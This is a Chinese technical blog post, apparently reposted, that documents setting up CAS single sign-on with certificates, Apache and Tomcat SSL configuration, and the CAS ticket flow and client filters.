<p>jks2pfx：证书导出工具<a href="http://www.myssl.cn/download/jks2pfx.zip" target="_blank"><a href="http://www.myssl.cn/download/jks2pfx.zip">http://www.myssl.cn/download/jks2pfx.zip</a></a></p>
<p>memcache：memcached-1.2.1-win32（需要memcache集群环境）</p>
<h2 id="-">二、安全证书生成</h2>
<p>1、<strong>keytool</strong></p>
<p>Apache、tomcat、jdk需要使用安全证书，进windows command窗口生成证书，命令如下：</p>
<p>--生成证书库</p>
<p>keytool -genkey -alias 800jit -keyalg RSA -keystore d:/cert/800jitkey</p>
<p>--从证书库中到处证书</p>
<p>keytool -export -file d:/cert/800jit.crt -alias 800jit -keystore d:/cert/800jitkey</p>
<p>--把证书导入jdk的证书库</p>
<p>keytool -import -keystore d: /jdk1.6.0_13/jre/lib/security/cacerts -file d:/cert/800jit.crt -alias 800jit</p>
<p>--生成Apache服务器的SSL连接需要配置私钥文件和证书文件</p>
<p>D:\casex\jks2pfx&gt;JKS2PFX.bat .keystore 800jitkey tomcat server_dev00</p>
<p>生成的server_dev00.crt，server_dev00.key放到D:/work/Apache2.2/conf/</p>
<p><strong>2**</strong>、openssl**</p>
<p>openssl req -config ..\conf\openssl.cnf -new -out olymtech.csr</p>
<p>openssl rsa -in privkey.pem -out olymtech.key</p>
<p>openssl x509 -in olymtech.csr -out olymtech.cert -req -signkey olymtech.key -days 3650</p>
<p>openssl x509 -in olymtech.cert -out olymtech.der.crt -outform DER</p>
<p>keytool -import -keystore d:/work/jdk1.6.0_13/jre/lib/security/cacerts -file d:/casex/ssl/olymtech.crt -alias olymtech</p>
<p>keytool -import -keystore D:/casex/800jitkey -file D:/casex/cas-doc/ssl/olymtech.crt -alias olymtech</p>
<h2 id="-apache-">三、Apache配置</h2>
<p>Apache+ssl+虚拟机</p>
<p>--修改http.conf文件</p>
<p>取消注释 LoadModule ssl_module modules/mod_ssl.so</p>
<p>取消注释 Include conf/extra/httpd-ssl.conf</p>
<p>取消注释 Include conf/extra/httpd-vhosts.conf</p>
<p>ProxyPass /cas  balancer://cas lbmethod=bytraffic stickysession=jsessionid</p>
<proxy balancer://cas/>

    BalancerMember ajp://192.168.1.190:10009/cas  loadfactor=1 route=jvm1

    BalancerMember ajp://192.168.1.190:8009/cas  loadfactor=1 route=jvm2

</proxy>



<p>--修改httpd-ssl.conf</p>
<p>在<VirtualHost _default_:443>下增加</p>
<p>ProxyPass /cas  balancer://cas/ lbmethod=bytraffic stickysession=jsessionid</p>
<p>ProxyPassReverse /cas balancer://cas/</p>
<p>SSLProxyEngine On</p>
<p>修改</p>
<p>SSLCertificateFile &quot;D:/work/Apache2.2/conf/server_dev00.crt&quot;</p>
<p>SSLCertificateKeyFile &quot;D:/work/Apache2.2/conf/server_dev00.key&quot;</p>
<p>--修改httpd-vhosts.conf</p>
<p>在<VirtualHost /*:80>下增加</p>
<p>ProxyPass /cas  balancer://cas/ lbmethod=bytraffic stickysession=jsessionid</p>
<p>ProxyPassReverse /cas balancer://cas/</p>
<h2 id="-tomcat-">四、Tomcat配置</h2>
<p>修改server.xml</p>
<p>--配置ssl</p>
<Connector port="8443" protocol="HTTP/1.1" SSLEnabled="true"

               maxThreads="150" scheme="https" secure="true"

               clientAuth="false" sslProtocol="TLS"

                        keystoreFile="d:/work/apache-tomcat-6.0.10/conf/800jitkey"

                        keystorePass="111111" />



<h2 id="-session-tomcat-">五、session共享（Tomcat）</h2>
<h2 id="-memcache-">六、memcache集群</h2>
<h1 id="cas-server-">CAS SERVER篇</h1>
<h2 id="-cas-">一、CAS 原理介绍</h2>
<p> <img src="" alt=""></p>
<p>访问流程图</p>
<p><strong>主要原理：</strong>用户第一次访问一个CAS 服务的客户web 应用时（访问URL ：<a href="http://192.168.1.90:8081/web1" target="_blank"><a href="http://192.168.1.90:8081/web1">http://192.168.1.90:8081/web1</a></a> ），部署在客户web 应用的cas AuthenticationFilter ，会截获此请求，生成service 参数，然后redirect 到CAS 服务的login 接口，url为<a href="https://cas:8443/cas/login?service=http%3A%2F%2F192.168.1.90%3A8081%2Fweb1%2F" target="_blank"><a href="https://cas:8443/cas/login?service=http%3A%2F%2F192.168.1.90%3A8081%2Fweb1%2F">https://cas:8443/cas/login?service=http%3A%2F%2F192.168.1.90%3A8081%2Fweb1%2F</a></a> ，认证成功后，CAS 服务器会生成认证cookie ，写入浏览器，同时将cookie 缓存到服务器本地，CAS 服务器还会根据service 参数生成ticket,ticket 会保存到服务器，也会加在url 后面，然后将请求redirect 回客户web 应用，url 为<a href="http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20" target="_blank"><a href="http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20">http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20</a></a> 。这时客户端的AuthenticationFilter 看到ticket 参数后，会跳过，由其后面的TicketValidationFilter 处理，TicketValidationFilter 会利用httpclient 工具访问cas 服务的/serviceValidate 接口, 将ticket 、service 都传到此接口，由此接口验证ticket 的有效性，TicketValidationFilter 如果得到验证成功的消息，就会把用户信息写入web 应用的session里。至此为止，SSO 会话就建立起来了，以后用户在同一浏览器里访问此web 应用时，AuthenticationFilter 会在session 里读取到用户信息，所以就不会去CAS 认证，如果在此浏览器里访问别的web 应用时，AuthenticationFilter 在session 里读取不到用户信息，会去CAS 的login 接口认证，但这时CAS 会读取到浏览器传来的cookie ，所以CAS 不会要求用户去登录页面登录，只是会根据service 参数生成一个ticket ，然后再和web 应用做一个验证ticket 的交互。</p>
<h2 id="-cas-">二、CAS 服务端的处理逻辑</h2>
<p>CAS 服务端总共对外定义了9 个接口，客户端通过访问这9 个接口与服务端交互，这9个接口为：
接口</p>
<p>说明</p>
<p>备注 /login</p>
<p>认证接口</p>
<p>  /logout</p>
<p>退出接口，负责销毁认证cookie</p>
<p>  /validate</p>
<p>验证ticket 用的接口，CAS1.0 定义</p>
<p>  /serviceValidate</p>
<p>验证ticket 用的接口，CAS2.0 定义，返回xml 格式的数据</p>
<p>  /proxy</p>
<p>支持代理认证功能的接口</p>
<p>  /proxyValidate</p>
<p>支持代理认证功能的接口</p>
<p>  /CentralAuthenticationService</p>
<p>用于和远程的web services 交互</p>
<p>  /remoteLogin（新增）</p>
<p>认证接口</p>
<p>  /directLogin（新增）</p>
<p>认证接口</p>
<p>详细说明：</p>
<p> <strong>/login:</strong></p>
<p>登录流程这部分要考虑到不同种类用户凭证的获取方案，以及客户应用传来的service 、gateway 、renew 参数的不同取值组合，CAS 为了实现流程的高度可配置性，采用了Spring Web Flow 技术。通过CAS 发布包里的login-webflow.xml 、cas-servlet.xml 、applicationContext.xml 这3 个文件，找出 了登录有关的所有组件，画出处理流程图。</p>
<p> <img src="" alt=""></p>
<p>CAS 默认的登录处理流程</p>
<p> <img src="" alt=""></p>
<p>第一次访问Web 应用的流程走向</p>
<p> <img src="" alt=""></p>
<p>已经登录web1 后，访问web1 的资源（web1 没有启动session ），或访问web2 的资源</p>
<p>注：</p>
<p>1 ： InitialFlowSetupAction: 是流程的入口。用 request.getContextPath() 的值来设置 cookie 的 Path 值， Cookie 的 path 值是在配置文件里定义的，但这个 Action 负责将 request.getContextPath() 的值设置为 Cookie 的 path 值，这是在 cas 部署环境改变的情况下，灵活地设置 cookie path 的方式；把 cookie 的值以及 service 参数的值放入 requestContext 的 flowscope 里。</p>
<p>2 ： GenerateServiceTicketAction 此 Action 负责根据 service 、 GTC cookie 值生成 ServiceTicket 对象， ServiceTicket 的 ID 就是返回给客户应用的 ticket 参数，如果成功创建 ServiceTicket ，则转发到 WarnAction ，如果创建失败，且 gateway 参数为 true ，则直接redirect 到客户应用， 否则则需要重新认证。</p>
<p>3 ： viewLoginForm 这是登录页面， CAS 在此收集用户凭证。 CAS 提供的默认实现是 /WEB-INF/view/jsp/simple/ui/casLoginView.jsp 。</p>
<p>4 ： bindAndValidate 对应 AuthenticationViaFormAction 的 doBind 方法，该方法负责搜集登录页面上用户录入的凭证信息（用户名、密码等），然后把这些信息封装到 CAS 内部的 Credentials 对象中。用户在 casLoginView.jsp 页面上点击提交后，会触发此方法。</p>
<p>5:submit   对应 AuthenticationViaFormAction 的 submit 方法 , 如果 doBind 方法成功执行完， 则触发 submit 方法，此方法负责调用centralAuthenticationService 的      grantServiceTicket 方法，完成认证工作，如果认证成功，则生成 TicketGrantingTicket 对象，放在缓存里， TicketGrantingTicket 的 ID 就是 TGC Cookie 的 value 值。</p>
<p>6 ： warn  CAS 提供了一个功能：用户在一个 web 应用中跳到另一个 web 应用时， CAS 可以跳转到一个提示页面，该页面提示用户要离开一个应用进入另一个应用，可以让用户自己选择。用户在登录页面 viewLoginForm 上选中了 id=”warn” 的复选框，才能开启这个功能。</p>
<p>WarnAction 就检查用户有没有开启这个功能，如果开启了，则转发到showWarnView, 如果没开启，则直接redirect 到客户应用。</p>
<p>7 ：SendTicketGrantingTicketAction 此Action 负责为response 生成TGC Cookie ，cookie 的值就是 AuthenticationViaFormAction 的submit 方法生成的 TicketGrantingTicket 对象的 ID 。</p>
<p>8 ： viewGenerateLoginSuccess 这是 CAS 的认证成功页面。</p>
<p><strong>/logout:</strong> （ 对应实现类 org.jasig.cas.web.LogoutController ）</p>
<p>处理逻辑：   </p>
<pre><code>    1) removeCookie

   2) 在服务端删除TicketGrantingTicket 对象（此对象封装了cookie 的value 值）

   3 ）redirect 到退出页面，有2 种选择：

      if(LogoutController 的followServiceRedirects 属性为true 值，且url 里的service 参数非空){

            redirect 到 sevice 参数标识的url

         }

      else{

         redirect 到内置的casLogoutView （cas/WEB-INF/view/jsp/default/ui/casLogoutView.jsp ），如果url 里有url 参数，则此url 参数标识的链接会显示在casLogoutView 页面上。

       }
</code></pre><p><strong>/serviceValidate: </strong>（对应实现类 org.jasig.cas.web.ServiceValidateController ）</p>
<p> 处理逻辑：  </p>
<p>  如果service 参数为空或ticket 参数为空，则转发到failureView （/WEB-INF/view/jsp/default/protocol/2.0/casServiceValidationFailure.jsp ）</p>
<pre><code>验证ticket 。以ticket 为参数，去缓存里找ServiceTicketImpl 对象，如果能找到，且没有过期，且ServiceTicketImpl 对象对应的service 属性和service 参数对应，则验证通过，验证通过后，请求转发至casServiceSuccessView （cas/WEB-INF/view/jsp/default/protocol/2.0/casServiceValidationSuccess.jsp ），验证不通过，则转发到failureView 。
</code></pre><h2 id="-">三、认证相关的概念及流程</h2>
<p>概念</p>
<ul>
<li><strong>Credentials**</strong> **用户提供的用于登录用的凭据信息，如用户名/ 密码、证书、IP 地址、Cookie 值等。比如 UsernamePasswordCredentials ，封装的是用户名和密码。CAS 进行认证的第一步，就是把从UI 或request 对象里取到的用户凭据封装成Credentials 对象，然后交给认证管理器去认证。</li>
<li><strong>AuthenticationHandler**</strong> **认证Handler, 每种AuthenticationHandler 只能处理一种Credentials ，如AbstractUsernamePasswordAuthenticationHandler 只负责处理 U sernamePasswordCredentials 。</li>
<li><strong>Principal</strong> 封装用户标识，比如 SimplePrincipal, 只是封装了用户名。认证成功后， credentialsToPrincipalResolvers 负责由Credentials 生成 Principal 对象。</li>
<li><strong>CredentialsToPrincipalResolvers**</strong> **负责由 Credentials 生成 Principal 对象，每种 CredentialsToPrincipalResolvers 只处理 一种Credentials ，比如 UsernamePasswordCredentialsToPrincipalResolver 负责从 U sernamePasswordCredentials 中取出用户名，然后将其赋给生成的 SimplePrincipal 的 ID 属性。</li>
<li><strong>AuthenticationMetaDataPopulators</strong> 负责将 Credentials 的一些属性赋值给 Authentication 的 attributes 属性。</li>
<li><strong>Authentication</strong>   Authentication是认证管理器的最终处理结果， Authentication 封装了 Principal ，认证时间，及其他一些属性（可能来自 Credentials ）。</li>
<li><strong>AuthenticationManager</strong> 认证管理器得到 Credentials 对象后，负责调度AuthenticationHandler 去完成认证工作，最后返回的结果是 Authentication 对象。</li>
<li><strong>CentralAuthenticationService**</strong> <strong> CAS 的服务类，对 Web 层提供了一些方法。该类还负责调用 AuthenticationManager 完成认证逻辑</strong>。**</li>
</ul>
<p>序列图</p>
<p> <img src="" alt=""></p>
<p>类图</p>
<p> <img src="" alt=""></p>
<h2 id="-ticket-http-zhenkm0507-javaeye-com-blog-546805-">四、<a href="http://zhenkm0507.javaeye.com/blog/546805" target="_blank">Ticket介绍</a></h2>
<p>CAS的核心就是其Ticket，及其在Ticket之上的一系列处理操作。CAS的主要票据有TGT、ST、PGT、PGTIOU、PT，其中TGT、ST是CAS1.0协议中就有的票据，PGT、PGTIOU、PT是CAS2.0协议中有的票据。</p>
<h3 id="-">一 名词解释</h3>
<ul>
<li>TGT（Ticket Grangting Ticket）</li>
</ul>
<p>TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS认证成功后，CAS生成cookie，写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT ，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。</p>
<ul>
<li>ST（Service Ticket）</li>
</ul>
<p>ST是CAS为用户签发的访问某一service的票据。用户访问service时，service发现用户没有ST，则要求用户去CAS获取ST。用户向CAS发出获取ST的请求，如果用户的请求中包含cookie，则CAS会以此cookie值为key查询缓存中有无TGT，如果存在TGT，则用此TGT签发一个ST，返回给用户。用户凭借ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源。</p>
<ul>
<li>PGT（Proxy Granting Ticket）</li>
</ul>
<p>Proxy Service的代理凭据。用户通过CAS成功登录某一Proxy Service后，CAS生成一个PGT对象，缓存在CAS本地，同时将PGT的值（一个UUID字符串）回传给Proxy Service，并保存在Proxy Service里。Proxy Service拿到PGT后，就可以为Target Service（back-end service）做代理，为其申请PT。</p>
<ul>
<li>PGTIOU（Proxy Granting Ticket IOU）</li>
</ul>
<p>PGTIOU是CAS协议中定义的一种附加票据，它增强了传输、获取PGT的安全性。
PGT的传输与获取的过程：Proxy Service调用CAS的serviceValidate接口验证ST成功后，CAS首先会访问pgtUrl指向的https url，将生成的 PGT及PGTIOU传输给proxy service，proxy service会以PGTIOU为key，PGT为value，将其存储在Map中；然后CAS会生成验证ST成功的xml消息，返回给Proxy Service，xml消息中含有PGTIOU，proxy service收到Xml消息后，会从中解析出PGTIOU的值，然后以其为key，在map中找出PGT的值，赋值给代表用户信息的Assertion对象的pgtId，同时在map中将其删除。</p>
<ul>
<li>PT（Proxy Ticket）</li>
</ul>
<p>PT是用户访问Target Service（back-end service）的票据。如果用户访问的是一个Web应用，则Web应用会要求浏览器提供ST，浏览器就会用cookie去CAS获取一个ST，然后就可以访问这个Web应用了。如果用户访问的不是一个Web应用，而是一个C/S结构的应用，因为C/S结构的应用得不到cookie，所以用户不能自己去CAS获取ST，而是通过访问proxy service的接口，凭借proxy service的PGT去获取一个PT，然后才能访问到此应用。</p>
<h3 id="-">二 代码解析</h3>
<p> <img src="" alt=""></p>
<p>CAS Ticket类图</p>
<ul>
<li>TicketGrantingTicket 的 grantServiceTicket方法</li>
</ul>
<p>方法声明：public synchronized ServiceTicket grantServiceTicket(final String id,final Service service, final ExpirationPolicy expirationPolicy, final boolean credentialsProvided)</p>
<p>方法描述:</p>
<p> 1：生成SerivceTicketImpl</p>
<p> 2：更新属性：</p>
<p>this.previousLastTimeUsed = this.lastTimeUsed;</p>
<p>   this.lastTimeUsed = System.currentTimeMillis();</p>
<p>   this.countOfUses++;</p>
<p> 3：给service对象的principal属性赋值</p>
<p> 4：将service对象放入map services</p>
<ul>
<li>ServiceTicket 的 grantTicketGrantingTicket方法</li>
</ul>
<p>方法声明：</p>
<p>public TicketGrantingTicket grantTicketGrantingTicket(final String id, final Authentication authentication,final ExpirationPolicy expirationPolicy)</p>
<p>方法描述：在CAS3.3对CAS2.0协议的实现中，PGT是由ST签发的，调用的就是ServiceTicket的grantTicketGrantingTicket方法。方法返回的TicketGrantingTicket对象，表征的是一个PGT对象，其中的ticketGrantingTicket属性的值是签发ST的TGT对象。</p>
<ul>
<li>TicketGrantingTicket 的 expire方法</li>
</ul>
<p>方法声明：void expire()</p>
<p>方法描述：</p>
<p>在CAS的logout接口实现中，要调用TGT对象的expire方法，然后会在缓存中清除此TGT对象。</p>
<p>expire方法的内容：循环遍历 services 中的Service对象，调用其logoutOfService方法。具体Service实现类中的logoutOfService方法的实现，要通知具体的应用，客户要退出。</p>
<h3 id="-tgt-st-pgt-pt-">三、TGT、ST、PGT、PT关系</h3>
<p>1：ST是TGT签发的。用户在CAS上认证成功后，CAS生成TGT，用TGT签发一个ST，ST的ticketGrantingTicket属性值是TGT对象，然后把ST的值redirect到客户应用。</p>
<p>2：PGT是ST签发的。用户凭借ST去访问Proxy service，Proxy service去CAS验证ST（同时传递PgtUrl参数给CAS），如果ST验证成功，则CAS用ST签发一个PGT，PGT对象里的ticketGrantingTicket是签发ST的TGT对象。</p>
<p>3：PT是PGT签发的。Proxy service代理back-end service去CAS获取PT的时候，CAS根据传来的pgt参数，获取到PGT对象，然后调用其grantServiceTicket方法，生成一个PT对象。</p>
<p> <img src="" alt=""></p>
<p>TGT、ST、PGT、PT之间的关联关系</p>
<h1 id="cas-client-">CAS CLIENT篇</h1>
<h2 id="casfilter-">CASFilter 参数说明：</h2>
<p>参数</p>
<p>是否必须</p>
<p>说明 com.olymtech.cas.client.filter.loginUrl</p>
<p>是</p>
<p>指定 CAS 提供登录页面的 URL com.olymtech.cas.client.filter.validateUrl</p>
<p>是</p>
<p>指定 CAS 提供 service ticket 或 proxy ticket 验证服务的 URL com.olymtech.cas.client.filter.serverName</p>
<p>是</p>
<p>指定客户端的域名和端口，是指客户端应用所在机器而不是 CAS Server 所在机器，该参数或 serviceUrl 至少有一个必须指定 com.olymtech.cas.client.filter.serviceUrl</p>
<p>否</p>
<p>该参数指定过后将覆盖 serverName 参数，成为登录成功过后重定向的目的地址 com.olymtech.cas.client.filter.wrapRequest</p>
<p>否</p>
<p>如果指定为 true，那么 CASFilter 将重新包装 HttpRequest,并且使 getRemoteUser() 方法返回当前登录用户的用户名 com.olymtech.cas.client.filter.noFilter</p>
<p>否</p>
<p>设置不过滤的路径，语法如下：/name1/,/name2, com.olymtech.cas.client.filter.proxyCallbackUrl</p>
<p>否</p>
<p>用于当前应用需要作为其他服务的代理(proxy)时获取 Proxy Granting Ticket 的地址 com.olymtech.cas.client.filter.authorizedProxy</p>
<p>否</p>
<p>用于允许当前应用从代理处获取 proxy tickets，该参数接受以空格分隔开的多个 proxy URLs，但实际使用只需要一个成功即可。当指定该参数过后，需要修改 validateUrl 到 proxyValidate，而不再是 serviceValidate com.olymtech.cas.client.filter.renew</p>
<p>否</p>
<p>如果指定为 true，那么受保护的资源每次被访问时均要求用户重新进行验证，而不管之前是否已经通过 com.olymtech.cas.client.filter.gateway</p>
<p>否</p>
<p>指定 gateway 属性</p>
<h1 id="-">应用整合篇</h1>
<h2 id="-java-">一、JAVA程序整合</h2>
<p><strong>1、**</strong>应用配置说明（结合cas client<strong>**）</strong></p>
<p>导入key到本地jdk（tomcat使用的jdk必须）</p>
<p>keytool -import -keystore d:/work/jdk1.6.0_13/jre/lib/security/cacerts -file d:/casex/800jit.crt -alias 800jit</p>
<p>在ie中导入证书800jit.crt</p>
<p>修改web程序的web.xml添加</p>
<pre><code>&lt;!-- 用于单点退出 --&gt;

&lt;listener&gt;

    &lt;listener-class&gt;org.jasig.cas.client.session.SingleSignOutHttpSessionListener&lt;/listener-class&gt;

&lt;/listener&gt;



&lt;filter&gt;

&lt;filter-name&gt;CAS Single Sign Out Filter&lt;/filter-name&gt;

&lt;filter-class&gt;org.jasig.cas.client.session.SingleSignOutFilter&lt;/filter-class&gt;

&lt;/filter&gt;



&lt;!-- 用于单点登录 --&gt;



&lt;filter&gt;

   &lt;filter-name&gt;CAS Filter&lt;/filter-name&gt;

   &lt;filter-class&gt;com.olymtech.cas.client.filter.CASFilter&lt;/filter-class&gt;

   &lt;init-param&gt;

       &lt;param-name&gt;com.olymtech.cas.client.filter.loginUrl&lt;/param-name&gt;

       &lt;param-value&gt;https://cas.server.com/cas/login&lt;/param-value&gt;

   &lt;/init-param&gt;

   &lt;init-param&gt;

       &lt;param-name&gt;com.olymtech.cas.client.filter.validateUrl&lt;/param-name&gt;

       &lt;param-value&gt;https://cas.server.com/cas/serviceValidate&lt;/param-value&gt;

   &lt;/init-param&gt;

   &lt;init-param&gt;

       &lt;param-name&gt;com.olymtech.cas.client.filter.serverName&lt;/param-name&gt;

       &lt;param-value&gt;saas.server.com&lt;/param-value&gt;

   &lt;/init-param&gt;

   &lt;init-param&gt;

       &lt;param-name&gt;com.olymtech.cas.client.filter.wrapRequest&lt;/param-name&gt;

       &lt;param-value&gt;true&lt;/param-value&gt;

   &lt;/init-param&gt;

&lt;/filter&gt;



&lt;filter-mapping&gt;

   &lt;filter-name&gt;CAS Single Sign Out Filter&lt;/filter-name&gt;

   &lt;url-pattern&gt;//*&lt;/url-pattern&gt;

&lt;/filter-mapping&gt;



&lt;filter-mapping&gt;

   &lt;filter-name&gt;CAS Filter&lt;/filter-name&gt;

   &lt;url-pattern&gt;//*&lt;/url-pattern&gt;

&lt;/filter-mapping&gt;
</code></pre><p>在jsp/servlet中得到登陆数据：</p>
<p>&lt;%@ page language=&quot;java&quot; import=&quot;com.olymtech.cas.client.filter.CASFilterRequestWrapper&quot;%&gt;</p>
<p>&lt;%</p>
<p>CASFilterRequestWrapper  reqWrapper=<strong>new</strong> CASFilterRequestWrapper(request);</p>
<p>String username = reqWrapper.getRemoteUser();</p>
<p>%&gt;</p>
<h2 id="-net-">二、.NET程序整合</h2>
<h1 id="-">附件</h1>
<p>ssl.rar（证书）</p>
<p>http.conf（apache配置文件）</p>
<p>httpd-ssl.conf（apache配置文件）</p>
<p>httpd-vhosts.conf（apache配置文件）</p>
<p>server.xml（tomcat配置文件）</p>
<p>AppSsoDemo-java.rar（java整合例子，包含所需jar包）</p>
<p>posted on 2010-08-05 17:23 <a href="http://www.cnblogs.com/hellowood/" target="_blank">horus</a> 阅读(2394) 评论(2) <a href="http://www.cnblogs.com/hellowood/admin/EditPosts.aspx?postid=1793364" target="_blank">编辑</a> <a href="http://www.cnblogs.com/hellowood/archive/2010/08/05/1793364.html#" target="_blank">收藏</a>
<img src="" alt=""></p>
<p><a href="">刷新评论</a><a href="http://www.cnblogs.com/hellowood/archive/2010/08/05/1793364.html#" target="_blank">刷新页面</a><a href="http://www.cnblogs.com/hellowood/archive/2010/08/05/1793364.html#top" target="_blank">返回顶部</a></p>
<p><a href="http://q.cnblogs.com/" target="_blank">程序员问答社区，解决您的技术难题</a>
<a href="http://www.cnblogs.com/" title="程序员的网上家园" target="_blank">博客园首页</a><a href="http://q.cnblogs.com/" title="程序员问答社区" target="_blank">博问</a><a href="http://news.cnblogs.com/" title="IT新闻" target="_blank">新闻</a><a href="http://home.cnblogs.com/ing/" target="_blank">闪存</a><a href="http://job.cnblogs.com/" target="_blank">程序员招聘</a><a href="http://kb.cnblogs.com/" target="_blank">知识库</a>
Powered by: <a href="http://www.cnblogs.com/" target="_blank">博客园</a> 模板提供：<a href="http://blog.hjenglish.com/" target="_blank">沪江博客</a> Copyright ©2012 horus</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/CAS/">CAS</a></li></span></span> | <span class="tags">Tagged <a href="/tags/CAS/" class="label label-primary">CAS</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-CAS--cas改造随笔-horus-博客园/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-CAS--cas改造随笔-horus-博客园" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/88/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/86/">86</a></li><li><a class="page-number" href="/page/87/">87</a></li><li><a class="page-number" href="/page/88/">88</a></li><li class="active"><li><span class="page-number current">89</span></li><li><a class="page-number" href="/page/90/">90</a></li><li><a class="page-number" href="/page/91/">91</a></li><li><a class="page-number" href="/page/92/">92</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/161/">161</a></li><li><a class="page-number" href="/page/162/">162</a></li><li><a class="extend next" href="/page/90/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Site powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a>  update time: <em>2014-04-07 17:26:53</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
